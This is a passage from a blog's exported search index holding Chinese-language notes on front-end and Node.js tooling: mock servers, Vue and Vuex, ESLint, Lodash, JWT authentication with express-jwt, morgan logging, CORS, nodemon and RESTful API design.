    <content type="text"><![CDATA[在实际开发中，最理想的前后端交互方式当然是后端先帮前端 mock 数据，然后前端开发，但现实很骨感，总会因为种种原因，前端需要自己来 mock 假数据。常用的伪造假数据的库有：Mockjs和easy-mock。这两个库有各自问题，因此需要一种新的 mock 假数据方案。 Mockjs原理是: 拦截了所有的请求并代理到本地，然后进行数据模拟，所以你会发现 network 中没有发出任何的请求。 但它的最大的问题是就是它的实现机制。它会重写浏览器的XMLHttpRequest对象，从而才能拦截所有请求，代理到本地。 大部分情况下用起来还是蛮方便的，但就因为它重写了XMLHttpRequest对象，所以比如progress方法，或者一些底层依赖XMLHttpRequest的库都会和它发生不兼容。 另外，因为是它是本地模拟数据，实际上不会走任何网络请求。所以本地调试起来很蛋疼，只能通过console.log来调试。 easy-mock天然支持跨域，还是支持MockJs的所有语法。但因为用的人多了，它的免费服务会经常的挂，可以说天天挂。官方的建议是自己搭建服务。如果你的公司整体搭建一个这样的 mock 服务的话也是一个不错的选择。但大部分人可能还是没有这个技术条件的。 新的Mock假数据方案本地会启动一个mock-server来模拟数据，线上环境还是继续使用mockjs来进行模拟(因为本项目是一个纯前端项目，你也可以自己搭建一个线上 server 来提供数据)。不管是本地还是线上所以的数据模拟都是基于mockjs生成的，所以只要写一套 mock 数据，就可以在多环境中使用。 该方案的好处是，在保留 mockjs 的优势的同时，解决之前的痛点。由于我们的 mock 是完全基于webpack-dev-serve来实现的，所以在你启动前端服务的同时，mock-server就会自动启动，这里还通过 chokidar 来观察 mock 文件夹内容的变化。在发生变化时会清除之前注册的mock-api接口，重新动态挂载新的接口，从而支持热更新。有兴趣的可以自己看一下代码 mock-server.js。由于是一个真正的server，所以你可以通过控制台中的network，清楚的知道接口返回的数据结构。并且同时解决了之前mockjs会重写 XMLHttpRequest对象，导致很多第三方库失效的问题。 vue.config.js中配置本地mock-server服务： 123456789101112131415161718192021222324devServer: &#123; port: port, open: true, overlay: &#123; warnings: false, errors: true &#125;, proxy: &#123; // change xxx-api/login =&gt; mock/login // detail: https://cli.vuejs.org/config/#devserver-proxy [process.env.VUE_APP_BASE_API]: &#123; target: `http://127.0.0.1:$&#123;port&#125;/mock`, changeOrigin: true, pathRewrite: &#123; [&apos;^&apos; + process.env.VUE_APP_BASE_API]: &apos;&apos; &#125; &#125; &#125;, // 输入app为exress实例，即var app = express(); // after: function(app, server) &#123; // do fancy stuff // &#125; after: require(&apos;./mock/mock-server.js&apos;) &#125; 参考链接 手摸手，带你用vue撸后台 系列五(v4.0新版本),by 花裤衩. Getting Started,by mockjs.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript最新语法学习笔记]]></title>
    <url>%2F2019%2F07%2F28%2FJavaScript%E6%9C%80%E6%96%B0%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JavaScript目前发展很快，明年都会出一些新的语法特性。为了便于学习，本文对一些遇到的JavaScript语法特性做一些笔记。 JavaScript版本简介JavaScript 由 Brendan Eich 于 1995 年发明，并于 1997 年成为 ECMA 标准。 ECMAScript 是该语言的官方名称。 从 2015 年起，ECMAScript 按年命名（ECMAScript 2015）。 ECMAScript 版本 版本 官方名称 描述 1 ECMAScript 1 (1997) 第一版。 2 ECMAScript 2 (1998) 只改变编辑方式。 3 ECMAScript 3 (1999) 添加了正则表达式。添加了 try/catch。 4 ECMAScript 4 从未发布过。 5 ECMAScript 5 (2009) 添加了“严格模式”。添加了 JSON 支持。添加了 String.trim()。添加了 Array.isArray()。添加了数组迭代方法。 5.1 ECMAScript 5.1 (2011) 编辑改变。 6 ECMAScript 2015 添加了 let 和 const。添加了默认参数值。添加了 Array.find()。添加了 Array.findIndex() 7 ECMAScript 2016 添加了指数运算符（**）。添加了 Array.prototype.includes。 8 ECMAScript 2017 添加了字符串填充。添加了新的 Object 属性。添加了异步功能。添加了共享内存。 9 ECMAScript 2018 添加了 rest / spread 属性。添加了异步迭代。添加了 Promise.finally()。增加 RegExp。 JavaScript新语法特性…运算符es6中引入扩展运算符（…），它用于把一个数组转化为用逗号分隔的参数序列，它常用在不定参数个数时的函数调用，数组合并等情形。 将实现了 Iterator 接口的对象转为数组 12var nodeList = document.querySelectorAll(&apos;div&apos;); var array = [...nodeList]; 解构赋值解构赋值语法是一种 Javascript 表达式。通过解构赋值, 可以将属性/值从对象/数组中取出,赋值给其他变量。 1234let &#123;a, b, ...rest&#125; = &#123;a: 10, b: 20, c: 30, d: 40&#125;a; // 10 b; // 20 rest; // &#123; c: 30, d: 40 &#125; async函数async函数是最新的javascript异步操作方式，初始定义于ES2017。async函数声明用于定义一个返回 AsyncFunction 对象的异步函数。异步函数是指通过事件循环异步执行的函数，它会通过一个隐式的 Promise 返回其结果。但是如果你的代码使用了异步函数，它的语法和结构会更像是标准的同步函数。 123456789101112131415161718/* 获取用户信息 */async function userInfoRoute(req, res, next) &#123; try &#123; var decoded = jwt.verify(req.body.token.split(&apos; &apos;)[1], appConfig.secretOrPrivateKey); var user = await models.User.findByPk(decoded.userId); res.json(&#123; code: 20000, data: user &#125;); &#125; catch (err) &#123; res.send(406, &#123; message: &apos;Account and password are incorrect.&apos; &#125;); &#125;&#125;/* 获取用户信息 */router.post(&apos;/user_info&apos;, userInfoRoute); 参考链接 JavaScript 版本,by w3school. ES6 扩展运算符 三个点（…）,by ten5743. 解构赋值,by MDN web docs. async 函数的含义和用法,by 阮一峰. async function,by MDN web docs. 从面向对象设计角度，全面解读——JS中的函数与对象、Object与Function、以及原型链与继承,by scott.cgi.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vuejs调试入门]]></title>
    <url>%2F2019%2F07%2F28%2FVuejs%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[每个应用，不论大小，都需要理解程序是如何运行失败的。下面将探讨调试浏览器中运行的通过 Vue CLI 生成的 Vue.js 应用程序。 前提条件 Chrome Vue CLI Vue Devtools 浏览器中展示源代码在可以从 VS Code 调试你的 Vue 组件之前，你需要更新 webpack 配置以构建 source map。做了这件事之后，我们的调试器就有机会将一个被压缩的文件中的代码对应回其源文件相应的位置。这会确保你可以在一个应用中调试，即便你的资源已经被 webpack 优化过了也没关系。 打开 config/index.js 并找到 devtool 属性。将其更新为： 如果你使用的是 Vue CLI 2，请设置并更新 config/index.js 内的 devtool 属性： 1devtool: &apos;source-map&apos;, 如果你使用的是 Vue CLI 3，请设置并更新 vue.config.js 内的 devtool 属性： 12345module.exports = &#123; configureWebpack: &#123; devtool: &apos;source-map&apos; &#125;&#125; 调试方法在Chrome浏览器中调试利用Chrome浏览器的开发工具，在Vuejs应用源代码中设置断点，进行调试。 图1 在Chrome浏览器中调试 简单的 debugger 语句可以直接在代码中使用原生的 debugger 语句。如果你选择了这种方式，请千万记得当你调试完毕之后把这个语句移除。 1234567891011121314&lt;script&gt;export default &#123; data() &#123; return &#123; message: &apos;&apos; &#125; &#125;, mounted() &#123; const hello = &apos;Hello World!&apos; debugger this.message = hello &#125;&#125;;&lt;/script&gt; 参考链接 在 VS Code 中调试,by vuejs.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ESLint工具入门教程]]></title>
    <url>%2F2019%2F07%2F27%2FESLint%E5%B7%A5%E5%85%B7%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[ESLint最初是由Nicholas C. Zakas 于2013年6月创建的开源项目。它的目标是提供一个插件化的javascript代码检测工具。 ESLint 是在 ECMAScript/JavaScript 代码中识别和报告模式匹配的工具，它的目标是保证代码的一致性和避免错误。在许多方面，它和 JSLint、JSHint 相似，除了少数的例外： ESLint 使用 Espree 解析 JavaScript。 ESLint 使用 AST 去分析代码中的模式 ESLint 是完全插件化的。每一个规则都是一个插件并且你可以在运行时添加更多的规则。 用户指南先决条件：Node.js (&gt;=6.14), npm version 3+。 你可以使用 npm 安装 ESLint： 1npm install eslint --save-dev 紧接着你应该设置一个配置文件： 1./node_modules/.bin/eslint --init 之后，你可以在任何文件或目录上运行ESLint如下： 1./node_modules/.bin/eslint yourfile.js 也可以在全局而不是本地安装 ESLint (使用 npm install eslint —global)。但是，你使用的任何插件或可共享配置都必须安装在本地。 命令行命令行工具有几个选项，你可以通过运行 eslint -h 查看所有选项。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455eslint [options] file.js [file.js] [dir]Basic configuration: --no-eslintrc Disable use of configuration from .eslintrc.* -c, --config path::String Use this configuration, overriding .eslintrc.* config options if present --env [String] Specify environments --ext [String] Specify JavaScript file extensions - default: .js --global [String] Define global variables --parser String Specify the parser to be used --parser-options Object Specify parser options --resolve-plugins-relative-to path::String A folder where plugins should be resolved from, CWD by defaultSpecifying rules and plugins: --rulesdir [path::String] Use additional rules from this directory --plugin [String] Specify plugins --rule Object Specify rulesFixing problems: --fix Automatically fix problems --fix-dry-run Automatically fix problems without saving the changes to the file system --fix-type Array Specify the types of fixes to apply (problem, suggestion, layout)Ignoring files: --ignore-path path::String Specify path of ignore file --no-ignore Disable use of ignore files and patterns --ignore-pattern [String] Pattern of files to ignore (in addition to those in .eslintignore)Using stdin: --stdin Lint code provided on &lt;STDIN&gt; - default: false --stdin-filename String Specify filename to process STDIN asHandling warnings: --quiet Report errors only - default: false --max-warnings Int Number of warnings to trigger nonzero exit code - default: -1Output: -o, --output-file path::String Specify file to write report to -f, --format String Use a specific output format - default: stylish --color, --no-color Force enabling/disabling of colorInline configuration comments: --no-inline-config Prevent comments from changing config or rules --report-unused-disable-directives Adds reported errors for unused eslint-disable directivesCaching: --cache Only check changed files - default: false --cache-file path::String Path to the cache file. Deprecated: use --cache-location - default: .eslintcache --cache-location path::String Path to the cache file or directoryMiscellaneous: --init Run config initialization wizard - default: false --debug Output debugging information -h, --help Show help -v, --version Output the version number --print-config path::String Print the configuration for the given file 修复警告和错误1eslint --fix file.js [file.js] [dir] 参考链接 ESLint 可组装的JavaScript和JSX检查工具,by ESLint homepage. VsCode保存时自动修复Eslint错误,by 前端进阶积累.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue-js入门简介]]></title>
    <url>%2F2019%2F07%2F26%2FVue-js%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。 Vue实例生命周期图示 核心插件VuexVuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。 Vuex核心store每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 (state)。Vuex 和单纯的全局对象有以下两点不同： Vuex 的状态存储是响应式的。当 Vue 组件从 store 中读取状态的时候，若 store 中的状态发生变化，那么相应的组件也会相应地得到高效更新。 你不能直接改变 store 中的状态。改变 store 中的状态的唯一途径就是显式地提交 (commit) mutation。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。 安装 Vuex 之后，让我们来创建一个 store。创建过程直截了当——仅需要提供一个初始 state 对象和一些 mutation： 123456789101112// 如果在模块化构建系统中，请确保在开头调用了 Vue.use(Vuex)const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; state.count++ &#125; &#125;&#125;) 现在，你可以通过 store.state 来获取状态对象，以及通过 store.commit 方法触发状态变更： 123store.commit(&apos;increment&apos;)console.log(store.state.count) // -&gt; 1 Vuex核心概念StateVuex 使用单一状态树——是的，用一个对象就包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (SSOT)”而存在。这也意味着，每个应用将仅仅包含一个 store 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。 Vuex 通过 store 选项，提供了一种机制将状态从根组件“注入”到每一个子组件中（需调用 Vue.use(Vuex)）： 1234567891011const app = new Vue(&#123; el: &apos;#app&apos;, // 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件 store, components: &#123; Counter &#125;, template: ` &lt;div class=&quot;app&quot;&gt; &lt;counter&gt;&lt;/counter&gt; &lt;/div&gt; `&#125;) 通过在根实例中注册 store 选项，该 store 实例会注入到根组件下的所有子组件中，且子组件能通过 this.$store 访问到。 GetterVuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。 Getter 接受 state 作为其第一个参数： 12345678910111213const store = new Vuex.Store(&#123; state: &#123; todos: [ &#123; id: 1, text: &apos;...&apos;, done: true &#125;, &#123; id: 2, text: &apos;...&apos;, done: false &#125; ] &#125;, getters: &#123; doneTodos: state =&gt; &#123; return state.todos.filter(todo =&gt; todo.done) &#125; &#125;&#125;) Getter 会暴露为 store.getters 对象，你可以以属性的形式访问这些值： 1store.getters.doneTodos // -&gt; [&#123; id: 1, text: &apos;...&apos;, done: true &#125;] Mutation更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数： 1234567891011const store = new Vuex.Store(&#123; state: &#123; count: 1 &#125;, mutations: &#123; increment (state) &#123; // 变更状态 state.count++ &#125; &#125;&#125;) 你不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 increment 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 store.commit 方法： 1store.commit(&apos;increment&apos;) 注意，Mutation必须是同步函数。 ActionAction 类似于 mutation，不同在于： Action 提交的是 mutation，而不是直接变更状态。 Action 可以包含任意异步操作。 123456789101112131415const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; state.count++ &#125; &#125;, actions: &#123; increment (context) &#123; context.commit(&apos;increment&apos;) &#125; &#125;&#125;) Action 通过 store.dispatch 方法触发： 1store.dispatch(&apos;increment&apos;) Module由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。 为了解决以上问题，Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割： 12345678910111213141516171819202122const moduleA = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;, getters: &#123; ... &#125;&#125;const moduleB = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;&#125;const store = new Vuex.Store(&#123; modules: &#123; a: moduleA, b: moduleB &#125;&#125;)store.state.a // -&gt; moduleA 的状态store.state.b // -&gt; moduleB 的状态 参考链接 Vue.js 教程,by Vue.js Homepage. Vuex教程,by Vue.js Homepage.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lodash入门简介]]></title>
    <url>%2F2019%2F07%2F25%2FLodash%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Lodash是一个一致性、模块化、高性能的 JavaScript 实用工具库。 安装浏览器环境： 1&lt;script src=&quot;lodash.js&quot;&gt;&lt;/script&gt; 通过 npm： 12$ npm i -g npm$ npm i --save lodash Node.js： 1234567891011121314// Load the full build.var _ = require(&apos;lodash&apos;);// Load the core build.var _ = require(&apos;lodash/core&apos;);// Load the FP build for immutable auto-curried iteratee-first data-last methods.var fp = require(&apos;lodash/fp&apos;); // Load method categories.var array = require(&apos;lodash/array&apos;);var object = require(&apos;lodash/fp/object&apos;); // Cherry-pick methods for smaller browserify/rollup/webpack bundles.var at = require(&apos;lodash/at&apos;);var curryN = require(&apos;lodash/fp/curryN&apos;); 优点Lodash 通过降低 array、number、objects、string 等等的使用难度从而让 JavaScript 变得更简单。 Lodash 的模块化方法 非常适用于： 遍历 array、object 和 string 对值进行操作和检测 创建符合功能的函数 示例1234_.defaults(&#123; &apos;a&apos;: 1 &#125;, &#123; &apos;a&apos;: 3, &apos;b&apos;: 2 &#125;);// → &#123; &apos;a&apos;: 1, &apos;b&apos;: 2 &#125;_.partition([1, 2, 3, 4], n =&gt; n % 2);// → [[1, 3], [2, 4]] 参考链接 Lodash,by lodash homepage.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[express-jwt使用帮助]]></title>
    <url>%2F2019%2F07%2F25%2Fexpress-jwt%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9%2F</url>
    <content type="text"><![CDATA[express-jwt是一个验证JsonWebTokens并设置req.user的connect/express中间件。此模块允许您使用Node.js应用程序中的JWT令牌验证HTTP请求。 JWT通常用于保护API端点，通常使用OpenID Connect发布。 Json web token结构JWT 的三个部分依次如下： Header（头部） Payload（负载） Signature（签名） HeaderHeader 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。最后，将上面的 JSON 对象使用 Base64URL 算法转成字符串。 PayloadPayload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。 1234567iss (issuer)：签发人exp (expiration time)：过期时间sub (subject)：主题aud (audience)：受众nbf (Not Before)：生效时间iat (Issued At)：签发时间jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true&#125; 注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。这个 JSON 对象也要使用 Base64URL 算法转成字符串。 Signatureignature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。 基于JWT的身份验证流程使用基于 JWT 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端 客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 Token 服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据 jsonwebtoken的使用jsonwebtoken是JSON Web Tokens在Nodejs平台的实现。它可以与express-jwt模块配合，在expressjs中实现基于JWT的身份验证。 安装步骤1npm install jsonwebtoken --save 使用帮助在expressjs中主要使用该模块生成JSON Web Tokens。其接口定义为： jwt.sign(payload, secretOrPrivateKey, [options, callback]) 123456var token = jwt.sign(&#123; userId: users[0].id &#125;, appConfig.secretOrPrivateKey, &#123; expiresIn: 60 * 60 * 6&#125;); jwt.verify(token, secretOrPublicKey, [options, callback]) 123// verify a token symmetric - synchronousvar decoded = jwt.verify(req.body.token.split(&apos; &apos;)[1], appConfig.secretOrPrivateKey);var user = await models.User.findByPk(decoded.userId); jwt.decode(token [, options]) 1234567// get the decoded payload ignoring signature, no secretOrPrivateKey neededvar decoded = jwt.decode(token);// get the decoded payload and headervar decoded = jwt.decode(token, &#123;complete: true&#125;);console.log(decoded.header);console.log(decoded.payload) express-jwt的使用安装帮助1npm install express-jwt --save 使用示例12345678910app.use(expressJWT(&#123; secret: appConfig.secretOrPrivateKey&#125;));app.use(function(err, req, res, next) &#123; console.log(err); if (err.name === &apos;UnauthorizedError&apos;) &#123; res.status(err.status || 401).send(err.message); &#125;&#125;); 参考链接 什么是 JWT — JSON WEB TOKEN, by Dearmadman JSON Web Token 入门教程,by 阮一峰. Cookie,Session和Token会话知识整理,by jack huang. node-jsonwebtoken,by auth0.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Expressjs组件morgan保存日志到文件的方法]]></title>
    <url>%2F2019%2F07%2F24%2FExpressjs%E7%BB%84%E4%BB%B6morgan%E4%BF%9D%E5%AD%98%E6%97%A5%E5%BF%97%E5%88%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[morgan是express默认的日志中间件，也可以脱离express，作为node.js的日志组件单独使用。 示例将日志打印到本地文件1234567891011121314var express = require(&apos;express&apos;);var app = express();var morgan = require(&apos;morgan&apos;);var fs = require(&apos;fs&apos;);var path = require(&apos;path&apos;);var accessLogStream = fs.createWriteStream(path.join(__dirname, &apos;access.log&apos;), &#123;flags: &apos;a&apos;&#125;);app.use(morgan(&apos;short&apos;, &#123;stream: accessLogStream&#125;));app.use(function(req, res, next)&#123; res.send(&apos;ok&apos;);&#125;);app.listen(3000); 日志切割一个线上应用，如果所有的日志都落地到同一个本地文件，时间久了，文件会变得非常大，既影响性能，又不便于查看。这时候，就需要用到日志分割了。 借助file-stream-rotator插件，可以轻松完成日志分割的工作。 1234567891011121314151617181920212223242526var FileStreamRotator = require(&apos;file-stream-rotator&apos;)var express = require(&apos;express&apos;)var fs = require(&apos;fs&apos;)var morgan = require(&apos;morgan&apos;)var path = require(&apos;path&apos;)var app = express()var logDirectory = path.join(__dirname, &apos;log&apos;)// ensure log directory existsfs.existsSync(logDirectory) || fs.mkdirSync(logDirectory)// create a rotating write streamvar accessLogStream = FileStreamRotator.getStream(&#123; date_format: &apos;YYYYMMDD&apos;, filename: path.join(logDirectory, &apos;access-%DATE%.log&apos;), frequency: &apos;daily&apos;, verbose: false&#125;)// setup the loggerapp.use(morgan(&apos;combined&apos;, &#123;stream: accessLogStream&#125;))app.get(&apos;/&apos;, function (req, res) &#123; res.send(&apos;hello, world!&apos;)&#125;) 参考链接 Node 进阶：express 默认日志组件 morgan 从入门使用到源码剖析,by 程序猿小卡.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Expressjs cors入门简介]]></title>
    <url>%2F2019%2F07%2F24%2FExpressjs-cors%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[在nodejs+expressjs+vuejs的解决方案中，服务器端应用开发和前端应用的开发是独立的。不过前端应用调用服务器端应用的RESTful API时涉及跨域资源访问，因此需要添加expressjs的cors模块。下面简要介绍cors模块的使用方法。 跨域资源共享简介跨域资源共享（CORS）是一种机制，允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。网页可以自由嵌入跨源图像，样式表，脚本，iframe和视频。但某些“跨域”请求，尤其是Ajax请求，默认情况下是由同源安全策略禁止的。 CORS定义了一种浏览器和服务器可以交互的方式，以确定允许跨源请求是否安全。它允许比纯粹的同源请求更多的自由和功能，但比简单地允许所有跨源请求更安全。 CORS规范最初是作为W3C建议书发布的，但该文件已经过时。目前主动维护的CORS定义规范是WHATWG的Fetch Living Standard。 CORS标准描述了新的HTTP标头，它为浏览器提供了一种仅在获得许可时才能请求远程URL的方法。 尽管服务器可以执行某些验证和授权，但浏览器通常负责支持这些标头并遵守它们所施加的限制。 对于可以修改数据的Ajax和HTTP请求方法（通常是GET以外的HTTP方法，或者某些MIME类型的POST用法），规范要求浏览器“预检”请求，通过HTTP OPTIONS请求从服务器请求支持的方法 方法，然后，在服务器“批准”时，使用实际的HTTP请求方法发送实际请求。 服务器还可以通知客户端是否应该随请求一起发送“凭证”（包括Cookie和HTTP身份验证数据）。 图1 跨域资源共享流程图 CORS安装CORS是一个node.js包，用于提供Connect / Express中间件，可用于启用具有各种选项的CORS。使用如下方式安装。 1npm install cors --save CORS示例 简单示例，允许所有跨域请求 12345678910111213var express = require(&apos;express&apos;)var cors = require(&apos;cors&apos;)var app = express()app.use(cors())app.get(&apos;/products/:id&apos;, function (req, res, next) &#123; res.json(&#123;msg: &apos;This is CORS-enabled for all origins!&apos;&#125;)&#125;)app.listen(80, function () &#123; console.log(&apos;CORS-enabled web server listening on port 80&apos;)&#125;) 参考链接 Cross-origin resource sharing,by wikipedia. 跨域资源共享 CORS 详解,by 阮一峰. cors,by expressjs.com.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nodemon入门简介]]></title>
    <url>%2F2019%2F07%2F23%2Fnodemon%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Nodemon是一个用于nodejs开发的工具程序，它将监视nodejs源中的任何更改并自动重新启动服务器。 nodemon不需要对代码或开发方法进行任何其他更改。 nodemon是node的替换包装器，在执行脚本时使用nodemon替换命令行上的单词node即可。 安装1npm install -g nodemon 使用1nodemon [your node app] 参考链接 nodemon,by remy. 在 Express 开发中使用 nodemon,by bubkoo.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful_API设计及测试入门]]></title>
    <url>%2F2019%2F07%2F23%2FRESTful-API%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[RESTful API是目前比较成熟的一套互联网应用程序的API设计理论，提供了一种统一的机制，方便不同的前端设备与后端进行通信，以应对前端设备层出不穷（手机、平板、桌面电脑、其他专用设备……）的状况。同时对开发人员而言，提供了一种规范，方便协作开发，降低了API接口设计的难度。 RESTful API设计规范请参考阮一峰老师的RESTful API 设计指南。 RESTful API的测试方法RESTful API设计好了之后，需要测试其可用性。常用的API测试工具有Postman。简单入门可参考Postman 安装及使用入门教程。 Postman中使用HTTP POST方法测试RESTful API时，需要了解POST提交数据的方法。 POST提交数据的方法POST 几种请求主要包括 application/x-www-form-urlencoded、 multipart/form-data、 application/json、text/xml 四种的方法。 服务端通常是根据请求头（Request Headers）中的 Content-Type 字段来获知请求中的消息主体是用何种方式编码，再对主体进行解析。POST 提交数据方案，包含了 Content-Type 和消息主体编码方式两部分。 application/x-www-form-urlencoded (默认常用) 这是最常见的 POST 提交数据的方式。浏览器的原生表单，如果不设置Content-type属性，就会默认该方式提交数据，并且提交的数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL 转码。 multipart/form-data 这是另一个常见的 POST 数据提交的方式。我们使用表单上传文件时，必须让表单的enctyped等于 multipart/form-data。 application/json application/json 这种方案，可以方便的提交复杂的结构化数据，这种POST提交方式越来越多，用来告诉服务端消息主体是序列化后的 JSON 字符串。 由于JSON规范的流行，出了低版本的IE之外，各大浏览器都支持 JSON.stringify 将JSON数据字符串化（编码）传到服务器，还可以通过 JSON.parse 将字符串转化（解码）为JSON数据供前端渲染或者其他处理。 text/xml 现在基本不用。 参考链接 RESTful API 设计指南,by 阮一峰. RESTful API 设计最佳实践,by Philipp Hauer. restful-api-design-references,by aisuhua. Postman Doc,by postman homepage. Postman 安装及使用入门教程,by Mafly. 四种常见的 POST 提交数据方式,by Jerry Qu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>软件工程</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML_DOM文档对象模型简介]]></title>
    <url>%2F2019%2F07%2F22%2FHTML-DOM%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E7%AE%80%E4%BB%8B%2F</url>
